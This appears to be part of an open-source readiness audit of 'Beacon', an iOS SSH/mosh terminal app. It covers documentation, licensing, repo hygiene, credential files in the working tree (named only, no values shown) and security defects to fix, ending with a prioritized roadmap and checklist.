**The one accurate onboarding doc is undiscoverable.** `docs/install-free-account.md`, `README.md`
`install-free-account.md` is genuinely excellent and Beacon-named (free-Apple-ID path, 7-day expiry, `Signing.xcconfig` rationale, AltStore/SideStore resigning, Tailscale-vs-Bonjour, a real FAQ) — but README references it zero times, so newcomers land on the broken "Vosh" instructions and never find it. **Fix:** Link it prominently from a rewritten README's Getting Started; consider an English version.

**README has no screenshots.** `README.md`
Zero images in README or PROJECT.md. For a visual product whose headline differentiator is a Dynamic Island Live Activity, screenshots are the primary "what is this" signal — and abundant current ones already exist under `design-audit/`. **Fix:** Add a screenshots section (home, terminal, tmux, and especially the Vibe Island compact/expanded/lock-screen Allow-Deny), committed to `docs/assets/`.

**All top-level docs are Chinese-only while the codebase is English.** `README.md`, `PROJECT.md`
A Chinese-only README is a hard barrier for most would-be contributors, who bounce before reaching the good English inline docs. (Keep the high-quality Chinese install guide — the issue is the absence of an English entry point.) **Fix:** English README as default landing doc; `README-zh.md` alongside.

**A live plaintext SSH credential and cookies sit in the repo root.** `secret.md`, `cookies.json` — *(cross-referenced with §4/§7; same items, same fix: delete from the working tree and rotate.)*

> ✅ **Positive — inline doc comments are a standout strength.**
> `HostCapabilities.swift`, `KeychainService.swift`, `Mosh/OCB3.swift`, `project.yml`
> Public types carry type-level docs plus WHY-rationale a contributor can rely on without reading the impl: `HostCapabilities` documents the exact probe command and why it lives outside the hub; `KeychainService` explains the Simulator vault fallback; `SSHService` explains the in-memory cache; `OCB3` is documented as clean-room RFC 7253; the `project.yml` SwiftTerm block is an exemplary 8-point patch rationale. **State this as an explicit expectation in `CONTRIBUTING` so the standard survives external contributions.**

---

## 7. Open-Source Release Readiness

### High severity

**No LICENSE — the repo is legally "all rights reserved."** *(Cross-referenced with §6.)* On the compatibility question the news is good: both SPM deps are permissive MIT (Citadel; the Cluas/SwiftTerm fork), and **mosh is NOT linked** — `Beacon/Services/Mosh/*` is a pure-Swift reimplementation of the SSP wire protocol, so the binary carries no GPL code and any license is available. One caveat: those Swift files cite mosh's GPL C++ as reference, so add a clean-room disclaimer. **Fix:** Add MIT/Apache-2.0 + a `THIRD-PARTY`/`NOTICES` file crediting SwiftTerm (MIT), Citadel (MIT), and the bundled fonts (fold in `Beacon/Resources/Fonts/LICENSES.md`).

**README describes a different, defunct app ("Vosh"); clone-and-build is broken.** *(Cross-referenced with §5/§6.)* Additionally hardcodes one developer's simulator UDID (`CE0FEF85-…`) and references a `VoshWidget/` target and `build/ mosh C++ 静态库` that don't reflect reality. **Fix:** Rewrite from scratch for Beacon; drop the UDID and paywall/StoreKit sections; describe the actual targets and the xcodegen-first workflow; provide English (or English + 中文).

**Real reusable credentials in the working tree (`secret.md`, `cookies.json`).** *(Cross-referenced with §4/§6.)* Confirmed never committed (`git log --all` clean), so no git-history leak — but a real, likely-reused password and a live session cookie physically present, plus a private RFC1918 host, are an operational hazard to any tarball/`git add -f`/backup. **Fix:** Delete before publish; rotate both regardless; if needed for local testing, move outside the repo.

**The entire `.claude/` agent harness is committed — personal absolute paths + ~600 vendored third-party docs.**
700+ of ~800 tracked files are under `.claude/`. (1) `.claude/settings.local.json` bakes in `/Users/cluas/…` paths and stale `Vosh-*` DerivedData; `.claude/memory/project_requirements.md` hardcodes repo paths; `.claude/architecture_comparison.md` and `agents/builder.md` are internal Chinese planning notes. (2) ~600 files under `.claude/skills/` are vendored third-party docs (Apple HIG text, framework references, other authors' skill packages) of mixed/unclear redistribution licensing. This is agent scaffolding, not product source. **Fix:** Add `.claude/` (or at least `skills/`, `settings.local.json`, `memory/`, `architecture_comparison.md`) to `.gitignore` and `git rm --cached` before publishing; keep only a sanitized, path-free `settings.json` if useful.

### Medium severity

**Internal planning/PRD/design-audit artifacts clutter the repo and advertise dead features.**
Tracked: `vibe-terminal-prd.docx`, `vibe-code-prototype.jsx` (61KB), `tmux_session_connect_flow.html`, `PROJECT.md`, `docs/superpowers/plans+specs` (still with `/Users/cluas/…` paths and "Vosh"). `design-audit/` carries ~180 PNGs including **paywall mockups** (`15-paywall.png`, `settings-locked.png`) for the removed monetization feature — so a browser sees screenshots of functionality that no longer exists. **Fix:** Move planning docs out of the public repo (or into a pruned `docs/archive`); delete/trim `design-audit/`, at minimum removing the paywall/locked-feature screenshots.

**Missing community & versioning scaffolding.** No CHANGELOG (MARKETING_VERSION is 1.0.0 with no tag/notes), no CONTRIBUTING, no CODE_OF_CONDUCT, no `.github/` (no issue/PR templates). **Fix:** Add a CHANGELOG (a 1.0.0 entry), a short CONTRIBUTING stating the xcodegen workflow + `xcodebuild test` expectation, a CODE_OF_CONDUCT, `.github/ISSUE_TEMPLATE` + `PULL_REQUEST_TEMPLATE`, and tag `v1.0.0`.

**Marketing website and k3s manifest committed into the app repo.** `site/`, `site-dist/`, `site/k8s/deploy.yaml` document the maintainer's personal deployment (ConfigMap `moshi-site`, nginx, domain `moshi.cluas.eu.org`) under the old brand. Exposes private hosting and mixes unrelated infra + stale branding. **Fix:** Move the site + manifest to a separate repo; if the landing page stays, strip the manifest and rebrand to Beacon.

### Low severity

**Generated `Beacon.xcodeproj` committed despite xcodegen being source-of-truth.** `.gitignore` only ignores `*.xcuserdata`; the full `project.pbxproj`, workspace, scheme, and `Package.resolved` are tracked, inviting drift and a mixed message about which file to edit. **Fix:** Pick one model and document it (gitignore + regenerate, keeping `Package.resolved`; or keep committed with a CI no-diff check and a CONTRIBUTING note that it's generated).

**Stale Moshi/Vosh branding in scripts and minor source.** `scripts/moshi-notify.sh` uses `VOSH_DEVICE_TOKEN`/`VOSH_API_URL` and placeholder `https://api.moshi.app`; test fixtures use `moshi-golden-*`/`moshitest-*`; `BeaconMark.swift` comments about the "Moshi era"; `docs/superpowers/*` and `PROJECT.md` say "Vosh." No real secrets (`VOSH_DEVICE_TOKEN` is unset; `api.moshi.app` is a placeholder), but three names read as half-finished. **Fix:** Final `git grep -i 'vosh\|moshi'` sweep across scripts/tests/docs; rename `moshi-notify.sh` → `beacon-notify.sh` with `BEACON_*` vars.

**Leftover GPL-mosh build script implies GPL C++ is in the binary when it is not.** `scripts/build-mosh-ios.sh`
Cross-compiles mosh 1.4.0 (GPL-3.0) + protobuf, and README lists `build/ mosh C++ 静态库`, yet the shipped transport is pure Swift and nothing links `libmosh` (grep found no references outside the script). So there's no GPL obligation, but the leftovers would lead a licensing-conscious reviewer to wrongly conclude the binary embeds GPL mosh. **Fix:** Delete the script (and the README line), or keep it with a header stating it is legacy, NOT part of the shipped build, and that Beacon links no GPL mosh code.

---

## Prioritized Roadmap

### Tier 1 — Quick wins *(small, high-impact; hours to a day or two each; unblock the release)*

1. **Add a `LICENSE`** (MIT or Apache-2.0) + a `THIRD-PARTY`/`NOTICES` file (SwiftTerm, Citadel, fonts). *Hard legal gate — do this first.*
2. **Delete `secret.md` and `cookies.json`** from the working tree; **rotate** the SSH password and the xiaohongshu session.
3. **Gitignore + `git rm --cached` the `.claude/` harness**, the marketing `site/`, and internal planning artifacts (PRD, `vibe-code-prototype.jsx`, `docs/superpowers`); trim `design-audit/` (remove paywall/locked screenshots).
4. **Rewrite the README** for Beacon (correct scheme/bundle id/Xcode 26.0, xcodegen-first clean-checkout steps, no paywall, no hardcoded UDID); provide an **English** entry point and link `docs/install-free-account.md`.
5. **Wrap the smoke-seed + `-MOSAIC_RESET` paths in `#if DEBUG`** so the key-planting/data-wipe path is stripped from release builds.
6. **Delete the dead `pumpTask` property** and fix its misleading `disconnect()` comment.
7. **Add CONTRIBUTING, CODE_OF_CONDUCT, CHANGELOG, and `.github/` templates**; tag `v1.0.0`.
8. **Delete/annotate `scripts/build-mosh-ios.sh`** and the stale README "mosh C++" line to keep the licensing story unambiguous.

### Tier 2 — Structural work *(real engineering; days to weeks; the substance of "high standard")*

1. **Fix the TOFU host-key race** (§3/§4 high): make trust decisions per-connection via handlers passed into `connect()`; delete the sidecar auto-accept; add a concurrency regression test. *Most serious code defect — do early.*
2. **Stand up CI** (GitHub Actions, macOS): xcodegen → SPM resolve → `xcodebuild test`, SPM cache keyed on `Package.resolved`; run the integration suite against a localhost sshd+tmux fixture; rename `VOSH_*` env vars to `BEACON_*`.
3. **Give the SwiftTerm fork a durable story**: patches as tagged commits on a named branch, pin `project.yml` to a fork *tag*, add `docs/PATCHES.md` with upstream PR links.
4. **Decompose `SessionHub`** into a `Transport` strategy protocol (SSH/Mosh/TmuxControl/MoshTmuxSidecar), extract `TerminalInputCodec`, and dedupe the repeated bootstrap blocks; then **unit-test transport selection + teardown/reconnect** with the existing mock seams.
5. **Introduce one `TerminalSessionViewModel`** presenting a uniform surface so `TerminalScreen` stops branching across transports.
6. **Add a `DatagramChannel` seam to `MoshTransport`** and test the SRTT/roaming/resume state machine; fix the receive-loop and scroll/wheel ordering to use the existing serialization primitives; add the mosh-resume reentrancy guard.
7. **Harden the tmux/shell injection boundary**: validate IDs by regex, quote-escape session names.
8. **Write `docs/ARCHITECTURE.md`** (transport layering, degrade matrix, mosh+tmux dual-transport rationale) and regenerate or delete `PROJECT.md`.
9. **Backfill the cheap pure-helper tests** (`TmuxLayoutParser` first, then `PlainLinkDetector`, `SSHKeyFactory`, `TerminalScrollback`, `SessionMetrics`, `AgentActivityMonitor`).

### Tier 3 — Nice to have *(polish; not blocking)*

1. Move the byte statics and split the large files into same-type extensions (`TmuxSessionController`, `TerminalScreen`, `AttachHomeView`).
2. Extract `TmuxSessionController` collaborators (`PaneViewRegistry`, `AgentHookBridge`, `ZoomPolicy`) and lift UIKit/SwiftUI out of the service actors.
3. Consolidate DI to a single composition root and one `KeychainService` instance.
4. Rename the third-generation leftovers (`-MOSAIC_*` args, `AttachHomeView`, `moshi-notify.sh`, test markers).
5. Promote the ~30 inline opacity magic values to `Ink` tokens; add `AppSettings.currentTerminalTheme`.
6. Add a minimal `os.Logger`, `.swiftlint.yml`/`.swiftformat`, a Brewfile pinning xcodegen, and screenshots in the README.
7. Bound the secret cache lifetime; move known-hosts to the keychain; tighten the bootstrap-error truncation; harden the `detach()`/`moshTmuxAttachTask` cancellation paths.
8. Promote the three shared Island files into a `BeaconShared` framework target.

---

## Closing Checklist — ordered path to "high-standard open source"

Legal & hygiene gate (must clear before the repo is public):

- [ ] 1. Add `LICENSE` + `NOTICES`/`THIRD-PARTY`.
- [ ] 2. Delete `secret.md` + `cookies.json`; rotate both credentials.
- [ ] 3. Untrack `.claude/`, `site/`, PRD/prototype/superpowers, and paywall screenshots; verify with a fresh `git archive` that nothing sensitive ships.
- [ ] 4. `#if DEBUG`-guard the smoke-seed + reset paths.

First impression (must be correct before inviting contributors):

- [ ] 5. Rewrite README (English, Beacon-correct, screenshots, links to the install guide).
- [ ] 6. Add CONTRIBUTING (xcodegen workflow, comment/testing/DI conventions), CODE_OF_CONDUCT, CHANGELOG, `.github/` templates; tag `v1.0.0`.
- [ ] 7. Regenerate or delete `PROJECT.md`; add `docs/ARCHITECTURE.md`.

Correctness & trust (the security/engineering substance):

- [ ] 8. Fix the TOFU host-key race (per-connection handlers, delete sidecar auto-accept, regression test).
- [ ] 9. Harden the tmux/shell injection boundary.
- [ ] 10. Add the mosh-resume reentrancy guard and route scroll/wheel + the receive loop through the proven serialization primitives.

Sustainability (so external PRs are safe to accept):

- [ ] 11. Stand up CI (build + unit tests + integration fixture); pin xcodegen; add lint/format.
- [ ] 12. Give the SwiftTerm fork a tagged-branch + `PATCHES.md` story (open the upstream PRs).
- [ ] 13. Decompose `SessionHub` into transport strategies + `TerminalInputCodec`, then unit-test it and `MoshTransport`; backfill the cheap pure-helper tests.

Everything in Tier 3 is genuine polish and can follow the public launch. The order above is deliberate: items 1–4 are non-negotiable gates, 5–7 fix the fatal first impression, 8–10 remove the trust-defeating defects a security-positioned terminal client cannot ship with, and 11–13 make the project maintainable by people other than its author. Clear items 1–10 and Beacon is a credible, safe open-source release; clear all 13 and it is a genuinely high-standard one — which, given the strengths already in the codebase, is well within reach.